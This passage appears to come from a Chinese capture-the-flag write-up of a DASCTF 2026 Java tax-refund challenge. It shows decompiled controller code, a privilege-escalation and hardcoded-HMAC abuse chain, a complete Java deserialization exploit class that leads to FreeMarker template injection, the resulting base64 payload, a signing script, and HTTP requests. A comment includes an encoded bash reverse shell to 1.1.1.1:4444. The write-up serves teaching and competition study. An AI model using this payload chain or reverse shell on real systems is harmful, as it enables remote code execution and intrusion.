IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.tax.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tax.model.RefundRequest;</span><br><span class="line"><span class="keyword">import</span> com.tax.model.TaxReport;</span><br><span class="line"><span class="keyword">import</span> com.tax.service.RefundService;</span><br><span class="line"><span class="keyword">import</span> com.tax.util.SerializeUtil;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExportController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RefundService refundService;</span><br><span class="line"><span class="comment">//验证权限和退税状态，生成导出令牌</span></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/api/export/prepare&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">prepareExport</span><span class="params">(<span class="meta">@RequestBody</span> Map&lt;String, Object&gt; body, HttpSession session)</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; result = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">role</span> <span class="operator">=</span> (String)session.getAttribute(<span class="string">&quot;role&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;reviewer&quot;</span>.equals(role) &amp;&amp; !<span class="string">&quot;admin&quot;</span>.equals(role)) &#123;</span><br><span class="line">            result.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            result.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Access denied: reviewer privileges required&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Long refundId;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                </span><br><span class="line">                refundId = Long.parseLong(body.get(<span class="string">&quot;refundId&quot;</span>).toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">                result.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                result.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Invalid refund ID&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">		<span class="comment">// 根据 ID 查询退税申请信息</span></span><br><span class="line">            <span class="type">RefundRequest</span> <span class="variable">req</span> <span class="operator">=</span> <span class="built_in">this</span>.refundService.getRefundById(refundId);</span><br><span class="line">            <span class="keyword">if</span> (req == <span class="literal">null</span>) &#123;</span><br><span class="line">                result.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                result.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Refund request not found&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="string">&quot;approved&quot;</span>.equals(req.getStatus())) &#123;</span><br><span class="line">                result.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                result.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Only approved refunds can be exported&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.getVoucherData() != <span class="literal">null</span> &amp;&amp; !req.getVoucherData().isEmpty()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> UUID.randomUUID().toString();</span><br><span class="line">                req.setExportToken(token);</span><br><span class="line">                <span class="built_in">this</span>.refundService.saveRefund(req);</span><br><span class="line">                result.put(<span class="string">&quot;success&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">                result.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Export prepared&quot;</span>);</span><br><span class="line">                result.put(<span class="string">&quot;exportToken&quot;</span>, token);</span><br><span class="line">                result.put(<span class="string">&quot;refundId&quot;</span>, refundId);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                result.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;No voucher data available for export&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//验证令牌后，反序列化凭证数据并返回具体内容</span></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/api/export/generate&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">generateExport</span><span class="params">(<span class="meta">@RequestBody</span> Map&lt;String, Object&gt; body, HttpSession session)</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; result = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">role</span> <span class="operator">=</span> (String)session.getAttribute(<span class="string">&quot;role&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;reviewer&quot;</span>.equals(role) &amp;&amp; !<span class="string">&quot;admin&quot;</span>.equals(role)) &#123;</span><br><span class="line">            result.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            result.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Access denied: reviewer privileges required&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Long refundId;</span><br><span class="line">            String exportToken;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 需要同时提供 refundId 和 exportToken</span></span><br><span class="line">                refundId = Long.parseLong(body.get(<span class="string">&quot;refundId&quot;</span>).toString());</span><br><span class="line">                exportToken = (String)body.get(<span class="string">&quot;exportToken&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">                result.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                result.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Invalid parameters&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (exportToken != <span class="literal">null</span> &amp;&amp; !exportToken.isEmpty()) &#123;</span><br><span class="line">                <span class="type">RefundRequest</span> <span class="variable">req</span> <span class="operator">=</span> <span class="built_in">this</span>.refundService.getRefundById(refundId);</span><br><span class="line">                <span class="keyword">if</span> (req == <span class="literal">null</span>) &#123;</span><br><span class="line">                    result.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    result.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Refund request not found&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> result;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.getExportToken() != <span class="literal">null</span> &amp;&amp; req.getExportToken().equals(exportToken)) &#123;</span><br><span class="line">                    req.setExportToken((String)<span class="literal">null</span>);</span><br><span class="line">                    <span class="built_in">this</span>.refundService.saveRefund(req);</span><br><span class="line">                    <span class="comment">// 获取凭证数据（序列化后的字符串）</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">voucherData</span> <span class="operator">=</span> req.getVoucherData();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">//反序列化凭证数据</span></span><br><span class="line">                        <span class="comment">// 提示凭证数据必须是 base64 编码的 TaxReport 序列化对象</span></span><br><span class="line">                        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> SerializeUtil.deserialize(voucherData);</span><br><span class="line">                        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> TaxReport) &#123;</span><br><span class="line">                            <span class="type">TaxReport</span> <span class="variable">report</span> <span class="operator">=</span> (TaxReport)obj;</span><br><span class="line">                            result.put(<span class="string">&quot;success&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">                            result.put(<span class="string">&quot;reportId&quot;</span>, report.getReportId());</span><br><span class="line">                            result.put(<span class="string">&quot;taxpayerId&quot;</span>, report.getTaxpayerId());</span><br><span class="line">                            result.put(<span class="string">&quot;amount&quot;</span>, report.getAmount());</span><br><span class="line">                            result.put(<span class="string">&quot;taxYear&quot;</span>, report.getTaxYear());</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            result.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                            result.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Unexpected object type: &quot;</span> + obj.getClass().getName() + <span class="string">&quot;. Expected: com.tax.model.TaxReport (serialVersionUID=1)&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        result.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">var10002</span> <span class="operator">=</span> e.getClass().getName();</span><br><span class="line">                        result.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Export generation failed: &quot;</span> + var10002 + <span class="string">&quot;: &quot;</span> + e.getMessage());</span><br><span class="line">                        result.put(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;Voucher data must be a valid base64-encoded Java serialized object of type com.tax.model.TaxReport&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> result;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    result.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    result.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Invalid export token&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> result;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                result.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Export token is required. Call /api/export/prepare first.&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/api/batch/process&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">batchProcess</span><span class="params">(HttpSession session)</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; result = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">role</span> <span class="operator">=</span> (String)session.getAttribute(<span class="string">&quot;role&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;admin&quot;</span>.equals(role)) &#123;</span><br><span class="line">            result.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            result.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Access denied: admin privileges required&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result.put(<span class="string">&quot;success&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            result.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Batch processing service is temporarily offline&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>调用路径要求：</p>
+<ul>
+<li><code>role∈ &#123;reviewer, admin&#125;</code>（漏洞 1 已绕过）</li>
+<li><code>RefundRequest.status == &quot;approved&quot;</code></li>
+<li><code>RefundRequest.exportToken 与请求参数匹配</code></li>
+</ul>
+<p>而审批阶段的关键代码（RefundService.approveRefund）：</p>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530140926222.png" alt="image-20260530140926222" /></p>
+<p>attachmentData 直接从 reviewer 提交的 JSON 里来，没经过 base64 校验，没做任何类型/魔法字节检查。</p>
+<p>签名的话，密钥直接硬编码了：<br />
+<img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530141152004.png" alt="image-20260530141152004" /></p>
+<p>依赖只有h2和springboot，没有可利用依赖，将视线转向源码</p>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530141346719.png" alt="image-20260530141346719" /></p>
+<p>这个<code>ScheduledTaskHandler</code>可序列化</p>
+<ul>
+<li>
+<p>声明并实例化一个<strong>任务队列</strong>，类型是 <code>LinkedList</code></p>
+</li>
+<li>
+<p>存储 <code>Runnable</code> 对象（可执行的任务）</p>
+</li>
+<li>
+<p>反序列化触发 → 直接调用 Runnable.run()</p>
+</li>
+</ul>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530141634588.png" alt="image-20260530141634588" /></p>
+<p><code>run() </code>调用 <code>PdfReportGenerator.render(templateContent)</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PdfReportGenerator</span></span><br><span class="line"><span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String reportFormat;</span><br><span class="line">	<span class="comment">//构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PdfReportGenerator</span><span class="params">(String reportFormat)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.reportFormat = reportFormat;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//渲染</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">render</span><span class="params">(String templateContent)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1. 创建 FreeMarker 配置对象，指定版本 2.3.31</span></span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">cfg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>(Configuration.VERSION_2_3_31);</span><br><span class="line">        <span class="comment">// 2. 创建字符串模板加载器</span></span><br><span class="line">        <span class="type">StringTemplateLoader</span> <span class="variable">stringLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTemplateLoader</span>();</span><br><span class="line">        <span class="comment">// 3. 将传入的字符串内容注册为名为 &quot;reportTemplate&quot; 的模板</span></span><br><span class="line">        stringLoader.putTemplate(<span class="string">&quot;reportTemplate&quot;</span>, templateContent);</span><br><span class="line">        <span class="comment">// 4. 设置配置对象的模板加载器</span></span><br><span class="line">        cfg.setTemplateLoader((TemplateLoader)stringLoader);</span><br><span class="line">        <span class="comment">// 5. 获取模板对象</span></span><br><span class="line">        <span class="type">Template</span> <span class="variable">template</span> <span class="operator">=</span> cfg.getTemplate(<span class="string">&quot;reportTemplate&quot;</span>);</span><br><span class="line">        <span class="comment">// 6. 创建字符串输出流</span></span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        <span class="comment">// 7. 处理模板：使用空的数据模型（空HashMap）渲染模板</span></span><br><span class="line">        template.process(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), (Writer)out);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            <span class="comment">// empty catch block</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将<code>templateContent </code>参数直接作为模板内容，存在FreeMarker模板渲染漏洞</p>
+<p>因此完整的利用链：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">注册账号</span><br><span class="line">  ↓</span><br><span class="line">POST /api/profile/update &#123;&quot;role&quot;:&quot;reviewer&quot;&#125;      # 漏洞1 提权</span><br><span class="line">  ↓</span><br><span class="line">POST /api/refund/apply ...                        # 创建一条 pending refund</span><br><span class="line">  ↓</span><br><span class="line">计算 HMAC-SHA256(payload, &quot;TaxManager_Secret_K3y_2026_Un1que&quot;)</span><br><span class="line">  ↓</span><br><span class="line">POST /api/reviewHeader: X-Signature: &lt;base64 hmac&gt;</span><br><span class="line">  Body: &#123;&quot;refundId&quot;:N,&quot;action&quot;:&quot;approve&quot;,&quot;attachmentData&quot;:&quot;&lt;base64 of evil ScheduledTaskHandler&gt;&quot;&#125;</span><br><span class="line">  ↓ voucherData 写入 DB</span><br><span class="line">POST /api/export/prepare &#123;&quot;refundId&quot;:N&#125;# 拿到 token</span><br><span class="line">  ↓</span><br><span class="line">POST /api/export/generate &#123;&quot;refundId&quot;:N,&quot;exportToken&quot;:&quot;...&quot;&#125;</span><br><span class="line">  → SerializeUtil.deserialize(voucherData)</span><br><span class="line">  → ScheduledTaskHandler.readObject()</span><br><span class="line">  → ReportJob.run()</span><br><span class="line">  → PdfReportGenerator.render(&lt;#assign ex=...?new()&gt;$&#123;ex(&quot;…&quot;)&#125;)</span><br><span class="line">  → RCE</span><br></pre></td></tr></table></figure>
+<p><strong>创建一笔 pending refund</strong></p>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530142621021.png" alt="image-20260530142621021" /></p>
+<p><strong>本地生成恶意序列化 payload</strong></p>
+<p>链路：<code>ScheduledTaskHandler.readObject() </code>→ <code>遍历 taskQueue </code>→ <code>每个 Runnable.run() </code>→ <code>ReportJob.run()</code> → <code>PdfReportGenerator.render</code>(模板) → Freemarker 模板执行命令。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.tax.job.ReportJob;</span><br><span class="line"><span class="keyword">import</span> com.tax.report.PdfReportGenerator;</span><br><span class="line"><span class="keyword">import</span> com.tax.util.ScheduledTaskHandler;</span><br><span class="line"><span class="keyword">import</span> com.tax.util.SerializeUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// Freemarker SSTI 模板：执行命令并回显 / 反弹 shell</span></span><br><span class="line">        <span class="comment">// 注意 ?new() 用 freemarker.template.utility.Execute</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">tpl</span> <span class="operator">=</span></span><br><span class="line">                <span class="string">&quot;&lt;#assign ex=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;$&#123;ex(\&quot;id\&quot;)&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 想反弹 shell 用：</span></span><br><span class="line">        <span class="comment">// String tpl = &quot;&lt;#assign ex=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt;&quot; +</span></span><br><span class="line">        <span class="comment">//              &quot;$&#123;ex(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;)&#125;&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="type">PdfReportGenerator</span> <span class="variable">gen</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PdfReportGenerator</span>(<span class="string">&quot;pdf&quot;</span>);</span><br><span class="line">        <span class="type">ReportJob</span> <span class="variable">job</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReportJob</span>(gen, tpl);<span class="type">ScheduledTaskHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScheduledTaskHandler</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ScheduledTaskHandler.class.getDeclaredField(<span class="string">&quot;taskQueue&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Queue&lt;Runnable&gt; q = (Queue&lt;Runnable&gt;) f.get(handler);</span><br><span class="line">        q.add(job);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化 + base64</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> SerializeUtil.serialize(handler);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//rO0ABXNyACFjb20udGF4LnV0aWwuU2NoZWR1bGVkVGFza0hhbmRsZXIAAAAAAAAAAQIAAUwACXRhc2tRdWV1ZXQAEUxqYXZhL3V0aWwvUXVldWU7eHBzcgAUamF2YS51dGlsLkxpbmtlZExpc3QMKVNdSmCIIgMAAHhwdwQAAAABc3IAFWNvbS50YXguam9iLlJlcG9ydEpvYgAAAAAAAAABAgACTAAJZ2VuZXJhdG9ydAAjTGNvbS90YXgvcmVwb3J0L1BkZlJlcG9ydEdlbmVyYXRvcjtMAA90ZW1wbGF0ZUNvbnRlbnR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyACFjb20udGF4LnJlcG9ydC5QZGZSZXBvcnRHZW5lcmF0b3IAAAAAAAAAAQIAAUwADHJlcG9ydEZvcm1hdHEAfgAHeHB0AANwZGZ0AEM8I2Fzc2lnbiBleD0iZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpPiR7ZXgoImlkIil9eA==</span></span><br></pre></td></tr></table></figure>
+<h4 id="计算-hmac-签名"><a class="markdownIt-Anchor" href="#计算-hmac-签名"></a> 计算 HMAC 签名</h4>
+<p><code>ReviewController.verifySignature </code>用 <code>HmacSHA256(attachmentData, &quot;TaxManager_Secret_K3y_2026_Un1que&quot;) </code>后 base64。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac, hashlib, base64</span><br><span class="line">payload_b64=<span class="string">&quot;rO0ABXNyACFjb20udGF4LnV0aWwuU2NoZWR1bGVkVGFza0hhbmRsZXIAAAAAAAAAAQIAAUwACXRhc2tRdWV1ZXQAEUxqYXZhL3V0aWwvUXVldWU7eHBzcgAUamF2YS51dGlsLkxpbmtlZExpc3QMKVNdSmCIIgMAAHhwdwQAAAABc3IAFWNvbS50YXguam9iLlJlcG9ydEpvYgAAAAAAAAABAgACTAAJZ2VuZXJhdG9ydAAjTGNvbS90YXgvcmVwb3J0L1BkZlJlcG9ydEdlbmVyYXRvcjtMAA90ZW1wbGF0ZUNvbnRlbnR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyACFjb20udGF4LnJlcG9ydC5QZGZSZXBvcnRHZW5lcmF0b3IAAAAAAAAAAQIAAUwADHJlcG9ydEZvcm1hdHEAfgAHeHB0AANwZGZ0AEM8I2Fzc2lnbiBleD0iZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpPiR7ZXgoImlkIil9eA==&quot;</span></span><br><span class="line">sig = base64.b64encode(hmac.new(</span><br><span class="line">    <span class="string">b&quot;TaxManager_Secret_K3y_2026_Un1que&quot;</span>,</span><br><span class="line">    payload_b64.encode(),</span><br><span class="line">    hashlib.sha256).digest()).decode()</span><br><span class="line"><span class="built_in">print</span>(sig)</span><br><span class="line"><span class="comment">#64RUsbqg310tifX3JLG79SjWm9qyuFPDWxBBVuWyM3s=</span></span><br></pre></td></tr></table></figure>
+<h4 id="写进-voucherdata"><a class="markdownIt-Anchor" href="#写进-voucherdata"></a> 写进 voucherData</h4>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /api/review</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=...</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">X-Signature</span><span class="punctuation">: </span>&lt;SIG&gt;</span><br><span class="line"></span><br><span class="line">&#123;&quot;refundId&quot;: N,</span><br><span class="line">  &quot;action&quot;: &quot;approve&quot;,</span><br><span class="line">  &quot;attachmentData&quot;: &quot;&lt;PAYLOAD_B64&gt;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530143736360.png" alt="image-20260530143736360" /></p>
+<p>返回 success:true。此刻数据库里 refund 1 的<code> voucherData =&lt;PAYLOAD_B64&gt;</code>，<code>status = approved</code>。</p>
+<h4 id="申请导出-token"><a class="markdownIt-Anchor" href="#申请导出-token"></a> 申请导出 token</h4>
+<p><img src="DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B.assets/image-20260530143818587.png" alt="image-20260530143818587" /></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;exportToken&quot;</span><span class="punctuation">:</span><span class="string">&quot;b5120bf0-2485-44de-bc21-a2dba689350a&quot;</span><span class="punctuation">,</span><span class="attr">&quot;success&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span><span class="string">&quot;Export prepared&quot;</span><span class="punctuation">,</span><span class="attr">&quot;refundId&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
